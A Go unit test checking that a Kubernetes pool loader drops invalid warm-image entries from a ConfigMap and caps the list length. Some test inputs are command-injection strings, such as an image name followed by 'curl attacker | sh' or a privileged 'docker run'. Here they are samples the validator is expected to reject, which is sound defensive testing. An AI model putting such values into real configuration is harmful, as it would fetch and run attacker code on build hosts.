package pool

import (
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"slices"
	"strings"
	"testing"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes/fake"
)

func warmImagesYAML(images ...string) string {
	var b strings.Builder
	b.WriteString("warm_images:\n")
	for _, img := range images {
		fmt.Fprintf(&b, "  - %q\n", img)
	}
	return b.String()
}

func TestLoadConfigKeepsOnlyValidWarmImages(t *testing.T) {
	overLimit := make([]string, 0, maxWarmImages+5)
	for i := range maxWarmImages + 5 {
		overLimit = append(overLimit, fmt.Sprintf("registry.example.com/img%d:v1", i))
	}

	tests := []struct {
		name string
		data string
		want []string
	}{
		{
			name: "hostile entries are dropped",
			data: warmImagesYAML("alpine:3.21", "alpine; curl attacker | sh", "docker.io/library/node:22-alpine"),
			want: []string{"alpine:3.21", "docker.io/library/node:22-alpine"},
		},
		{
			name: "an all-hostile list warms nothing",
			data: warmImagesYAML("alpine`curl attacker`", "alpine\ndocker run --privileged attacker"),
			want: nil,
		},
		{
			name: "a list past the entry limit stops at the limit",
			data: warmImagesYAML(overLimit...),
			want: overLimit[:maxWarmImages],
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			log.SetOutput(io.Discard)
			t.Cleanup(func() { log.SetOutput(os.Stderr) })
			warmImageLogMu.Lock()
			lastWarmImageWarning = ""
			warmImageLogMu.Unlock()

			client := fake.NewSimpleClientset(&corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{Name: ConfigMapName, Namespace: "builds"},
				Data:       map[string]string{"config.yaml": tt.data},
			})

			cfg := LoadConfig(context.Background(), client, "builds")
			if !slices.Equal(cfg.WarmImages, tt.want) {
				t.Fatalf("LoadConfig warm images = %q, want %q", cfg.WarmImages, tt.want)
			}
		})
	}
}
